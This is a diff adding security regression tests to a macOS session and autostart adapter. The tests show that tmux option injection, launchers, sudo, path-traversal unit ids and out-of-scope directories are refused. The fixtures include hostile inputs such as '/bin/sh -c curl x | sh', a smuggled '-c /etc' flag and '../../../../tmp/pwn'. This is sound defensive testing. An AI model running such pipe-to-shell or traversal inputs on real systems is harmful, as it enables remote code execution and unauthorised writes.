@@ -130,3 +130,135 @@ describe('darwin specifics of the session and path facets', () => {
     expect(decision.allowed).toBe(true);
   });
 });
+
+/**
+ * C1 and C2 from the security review on PR #72. Both were reproduced against the real tools before
+ * being fixed: tmux 3.7c placed a session in /private/etc when the command carried a second `-c`,
+ * and a traversing unit id composed a path outside the login-agent directory.
+ */
+describe('a caller-supplied command cannot reconfigure the session backend', () => {
+  /** The backend has no session until `new-session` runs. A fake that always lists one would send
+   * every attach down the reattach path, and the creation argv -- the thing under test -- would
+   * never be built. */
+  const scriptedBackend = (): { run: DarwinEnv['run']; spawned: () => (readonly string[])[] } => {
+    const spawned: (readonly string[])[] = [];
+    let created = false;
+    return {
+      spawned: () => spawned,
+      run: (argv) => {
+        spawned.push(argv);
+        if (argv[1] === 'new-session') {
+          created = true;
+          return { code: 0, stdout: '', stderr: '', error: null };
+        }
+        return created
+          ? { code: 0, stdout: 'attempt-1\t1700000000\n', stderr: '', error: null }
+          : { code: 1, stdout: '', stderr: 'no server running', error: null };
+      },
+    };
+  };
+
+  const attaching = async (command: readonly string[] | null, over: Partial<DarwinEnv> = {}) => {
+    const adapter = createDarwinHostAdapter(env(over));
+    return adapter.session_manager().attach({
+      session_id: 'attempt-1',
+      working_directory: '/Users/owner/projects',
+      command,
+    });
+  };
+
+  it('refuses a command that begins with an option, which the backend would read as its own', async () => {
+    // The measured attack: tmux takes the LAST occurrence of a flag, so this overrode `-c` and put
+    // the session in /private/etc, discarding the canonicalized directory entirely.
+    const attachment = await attaching(['-c', '/etc', 'sh']);
+    expect(attachment.outcome).toBe('refused');
+    expect(attachment.refused_reason).toMatch(/may not begin with an option/);
+  });
+
+  it('refuses a launcher, which would put the deny-list one indirection from what runs', async () => {
+    const attachment = await attaching(['sh', '-c', 'launchctl bootstrap gui/501 x.plist']);
+    expect(attachment.outcome).toBe('refused');
+    expect(attachment.refused_reason).toMatch(/exists to run another program/);
+  });
+
+  it('refuses an owner-run binary named directly, by basename and by full path', async () => {
+    for (const command of [
+      ['sudo', 'x'],
+      ['/usr/bin/sudo', 'x'],
+    ]) {
+      const attachment = await attaching(command);
+      expect(attachment.outcome).toBe('refused');
+      expect(attachment.refused_reason).toMatch(/owner-run only/);
+    }
+  });
+
+  it('ends option parsing before the command, so no later element can be read as a flag', async () => {
+    const backend = scriptedBackend();
+    await attaching(['/usr/local/bin/agent', '-c', '/etc'], { run: backend.run });
+    const create = backend.spawned().find((a) => a[1] === 'new-session');
+    expect(create).toBeDefined();
+    if (create === undefined) return;
+    const separator = create.indexOf('--');
+    expect(separator).toBeGreaterThan(-1);
+    // Every command element sits after the separator, and the canonicalized directory sits before
+    // it -- so the backend cannot reach its own `-c` through anything the caller supplied.
+    expect(create.indexOf('/usr/local/bin/agent')).toBeGreaterThan(separator);
+    expect(create.lastIndexOf('-c')).toBeGreaterThan(separator);
+    expect(create.indexOf('-c')).toBeLessThan(separator);
+    expect(create[create.indexOf('-c') + 1]).toBe('/Users/owner/projects');
+  });
+
+  it('allows an ordinary command', async () => {
+    const attachment = await attaching(['/usr/local/bin/agent', '--serve'], {
+      run: scriptedBackend().run,
+    });
+    expect(attachment.outcome).toBe('created');
+  });
+});
+
+describe('an autostart plan cannot write outside the login-agent directory', () => {
+  const adapter = () => createDarwinHostAdapter(env()).autostart_contract();
+  /**
+   * PLAN above logs to `/Users/owner/logs`, outside the single allow root, and is now refused.
+   * That is the new rule rather than a broken fixture: `allow_roots` is the filesystem scope this
+   * adapter may touch, and a manifest is an instruction for login-time writes, so a plan that logs
+   * outside that scope is the adapter arranging writes it is not itself permitted to make. Widening
+   * the roots is the owner's move; PLAN is left alone because the rendering tests above are about
+   * escaping, not installability.
+   */
+  const INSTALLABLE: AutostartPlan = { ...PLAN, log_directory: '/Users/owner/projects/logs' };
+
+  it('refuses a unit id that would traverse out of the directory it names', async () => {
+    for (const unit_id of ['../../../../tmp/pwn', 'a/b', '.hidden', 'x..y/../z']) {
+      await expect(adapter().install({ ...INSTALLABLE, unit_id })).rejects.toThrow(
+        /bare identifier/,
+      );
+      await expect(adapter().status(unit_id)).rejects.toThrow(/bare identifier/);
+      await expect(adapter().repair({ ...INSTALLABLE, unit_id })).rejects.toThrow(
+        /bare identifier/,
+      );
+    }
+  });
+
+  it('refuses a plan whose program is a launcher, which would survive a reboot', async () => {
+    await expect(
+      adapter().install({ ...INSTALLABLE, program: ['/bin/sh', '-c', 'curl x | sh'] }),
+    ).rejects.toThrow(/exists to run another program/);
+  });
+
+  it('refuses a plan whose directories fall outside the allowed roots', async () => {
+    await expect(adapter().install({ ...INSTALLABLE, log_directory: '/etc' })).rejects.toThrow(
+      /log_directory/,
+    );
+    await expect(adapter().install({ ...INSTALLABLE, working_directory: '/etc' })).rejects.toThrow(
+      /working_directory/,
+    );
+  });
+
+  it('still accepts the ordinary reverse-DNS shape', async () => {
+    const result = await adapter().install(INSTALLABLE);
+    expect(result.manifest_path).toBe(
+      '/Users/owner/Library/LaunchAgents/placeholder.autostart.plist',
+    );
+  });
+});
